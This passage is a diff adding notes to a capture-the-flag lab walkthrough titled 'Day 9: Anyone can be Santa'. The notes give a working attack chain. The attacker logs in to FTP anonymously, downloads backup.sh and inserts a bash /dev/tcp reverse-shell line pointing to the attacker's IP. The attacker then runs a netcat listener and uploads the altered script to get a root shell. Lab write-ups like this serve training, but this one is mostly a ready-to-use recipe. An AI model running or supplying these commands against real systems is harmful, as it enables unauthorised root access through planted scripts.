@@ -7,3 +7,20 @@ Day 9: Anyone can be Santa - Prelude:
 ====================================================================
 ....................................................................
 
+how to get in to FTP:
+#ftp ip_addrs_victim
+name: anonymous
+
+get to download the files from ftp server and put to download files from ftp server.
+
+download the files from ftp server and put our malicious code in backup.sh
+#bash -i >& /dev/tcp/Your_tun0_IP/4444 0>&1
+
+then run the netcat listner:
+#nc -lnvp 4444
+
+use the put command to upload that modified .sh file on ftp server.
+
+
+#You have the full root shell !!
+
